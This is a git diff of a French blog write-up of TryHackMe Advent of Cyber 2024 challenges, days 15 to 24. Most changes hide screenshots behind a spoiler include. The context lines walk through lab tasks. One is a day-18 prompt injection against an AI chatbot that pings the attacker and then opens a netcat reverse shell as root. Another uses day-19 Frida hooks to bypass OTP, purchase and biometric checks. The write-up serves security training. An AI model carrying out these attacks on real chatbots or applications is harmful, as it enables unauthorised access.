 Afin d'y voir plus clair, nous commençons par filtrer les logs de sécurité afin de ne conserver que les événements de logon (4624)
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-15_filter.png" caption="Filtre sur les événements 4624 (logon)" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-15_filter.png" caption="Filtre sur les événements 4624 (logon)" %}
 
 Puis nous utilisons l'outil de recherche pour n'obtenir que les événements de connexion de l'utilisateur glitch
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-15_find.png" caption="Recherche du terme 'glitch'" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-15_find.png" caption="Recherche du terme 'glitch'" %}
 
 Nous trouvons finalement les informations sur l'authentication de Glitch_Malware
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-15_glitch_logon.png" caption="Informations sur le logon de l'utilisateur Glitch" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-15_glitch_logon.png" caption="Informations sur le logon de l'utilisateur Glitch" %}
 
 Nous ouvrons à présent le fichier contenant l'historique PowerShell du compte `Administrator`.
 
@@ -1261,7 +1294,7 @@ ping 1.1.1.1
 
 Nous nous intéressons maintenant aux logs PowerShell récupérés avec Sysmon pour tenter de retrouver le mot de passe de Glitch_Malware.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-15_password.png" caption="Mot de passe de Glitch dans les logs PowerShell" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-15_password.png" caption="Mot de passe de Glitch dans les logs PowerShell" %}
 
 Enfin nous analysons les {% include dictionary.html word="GPO" %} en place pour découvrir les résultats de la compromission.
 
@@ -1459,23 +1492,23 @@ Le défi du jour consiste à naviguer dans les logs grâce à l'outil [Splunk](h
 
 Nous commençons par vérifier le nombre d'événements de connexions réussies dans l'index `cctv_feed`.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-17_login_successful.png" caption="Nombre de connexions réussies capturées" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-17_login_successful.png" caption="Nombre de connexions réussies capturées" %}
 
 Puis nous recherchons des traces de suppression d'enregistrements, et nous obtenons un identifiant de session qui nous devrait nous permettre de remonter vers le responsable.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-17_DeleteRecording.png" caption="Logs de la suppression d'enregistrements" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-17_DeleteRecording.png" caption="Logs de la suppression d'enregistrements" %}
 
 En pivotant sur l'index `web_logs` avec cet identifiant, nous trouvons l'adresse IP mise en cause.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-17_ip_address.png" caption="Adresse IP liée à la suppression des enregistrements" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-17_ip_address.png" caption="Adresse IP liée à la suppression des enregistrements" %}
 
 Cette adresse IP est liée à d'autres sessions :
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-17_other_session.png" caption="On observe d'autres identifiants de sessions liés à cette adresse IP" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-17_other_session.png" caption="On observe d'autres identifiants de sessions liés à cette adresse IP" %}
 
 En retournant sur l'index `cctv_feed`, l'une des sessions nous permet de retrouver le nom de l'utilisateur à l'origine de la suppression des enregistrements.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-17_user.png" caption="Nom de l'utilisateur qui a supprimé les enregistrements" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-17_user.png" caption="Nom de l'utilisateur qui a supprimé les enregistrements" %}
 
 ## Jour 18 : Je pourrais utiliser de l'interaction avec l'IA
 
@@ -1485,11 +1518,11 @@ En retournant sur l'index `cctv_feed`, l'une des sessions nous permet de retrouv
 
 Ce défi consiste à trouver les failles d'un *chatbot* alimenté à l'intelligence artificielle afin de gagner un accès illégitime.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-18_test.png" caption="Nous disposons de quelques exemples pour comprendre le fonctionnement" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-18_test.png" caption="Nous disposons de quelques exemples pour comprendre le fonctionnement" %}
 
 En interceptant les paquets ICMP (ping) avec `tcpdump` depuis notre machine d'attaque, nous pouvons tenter d'envoyer un ping vers notre machine depuis le *chatbot* :
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-18_injection_test.png" caption="Il est possible d'injecter un prompt non prévu" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-18_injection_test.png" caption="Il est possible d'injecter un prompt non prévu" %}
 
 L'injection de code a fonctionné, nous observons le trafic suivant :
 
@@ -1510,7 +1543,7 @@ listening on ens5, link-type EN10MB (Ethernet), capture size 262144 bytes
 
 Nous mettons notre machine d'attaque en écoute avec {% include dictionary.html word="netcat" %}, nous injectons du code permettant d'obtenir un *{% include dictionary.html word="reverse-shell" %}*
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-18_revshell.png" caption="Injection d'un reverse shell" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-18_revshell.png" caption="Injection d'un reverse shell" %}
 
 Nous obtenons ainsi un accès en tant que root sur la machine hébergeant le *chatbot*
 
@@ -1558,7 +1591,7 @@ Started tracing 4 functions. Web UI available at http://localhost:1337/
  73825 ms  _Z7set_otpi()
 ```
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_set-otp.png" caption="Fonction servant à générer le code OTP" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_set-otp.png" caption="Fonction servant à générer le code OTP" %}
 
 ```js
 defineHandler({
@@ -1583,7 +1616,7 @@ Instrumenting...
 707990 ms  OTP Code: 833945 #Récupération d'un code otp
 ```
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_first_flag.png" caption="Le pingouin nous fourni le premier flag" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_first_flag.png" caption="Le pingouin nous fourni le premier flag" %}
 
 Second pingouin :
 
@@ -1598,7 +1631,7 @@ Instrumenting...
 1441061 ms  _Z17validate_purchaseiii() #Nouveau fichier à analyser
 ```
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_purchase.png" caption="Script gérant l'achat d'items" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_purchase.png" caption="Script gérant l'achat d'items" %}
 
 ```js
 defineHandler({
@@ -1641,7 +1674,7 @@ defineHandler({
 });
 ```
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_second_flag.png" caption="Deuxième flag" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_second_flag.png" caption="Deuxième flag" %}
 
 Troisième pingouin
 
@@ -1662,7 +1695,7 @@ Instrumenting...
 3119459 ms  _Z16check_biometricsPKc()
 ```
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_biometric.png" caption="Script répondant à la validation de la biométrie" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_biometric.png" caption="Script répondant à la validation de la biométrie" %}
 
 ```js
 defineHandler({
@@ -1707,7 +1740,7 @@ defineHandler({
 });
 ```
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_third_flag.png" caption="Troisième et dernier flag" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_third_flag.png" caption="Troisième et dernier flag" %}
 
 ## Jour 20 : Si tu prononces ne serait-ce qu'un seul paquet
 
@@ -1795,7 +1828,7 @@ Beacon acknowledged
 
 Le chiffrement AES-ECB étant reversible, il est possible de déchiffrer les informations qui ont été récupérées par Mayor Malware grâce au site [CyberChef](https://gchq.github.io/CyberChef/)
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-20_beacon.png" caption="Informations déchiffrées" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-20_beacon.png" caption="Informations déchiffrées" %}
 
 ## Jour 21 : *HELP ME...I'm REVERSE ENGINEERING*
 
@@ -1993,15 +2026,15 @@ transaction_ref
 
 Analyse des paquets {% include dictionary.html word="MQTT" %}
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-24_mqtt.png" caption="Paquets MQTT contenant un topic et un message" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-24_mqtt.png" caption="Paquets MQTT contenant un topic et un message" %}
 
 En regardant le message en détail, nous constatons qu'il s'agit du texte `on` en héxadécimal.
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-24_challenge.png" caption="Le défi consiste à allumer la lumière en envoyant la bonne requête MQTT via Mosquitto" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-24_challenge.png" caption="Le défi consiste à allumer la lumière en envoyant la bonne requête MQTT via Mosquitto" %}
 
 ```bash
 mosquitto_pub -h localhost -t "d2FyZXZpbGxl/Y2hyaXN0bWFzbGlnaHRz" -m "6f6e" #N'a pas fonctionné
 mosquitto_pub -h localhost -t "d2FyZXZpbGxl/Y2hyaXN0bWFzbGlnaHRz" -m "on"
 ```
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-24_flag.png" caption="Le flag apparaît lorsque le message est correctement envoyé" %}
+{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-24_flag.png" caption="Le flag apparaît lorsque le message est correctement envoyé" %}
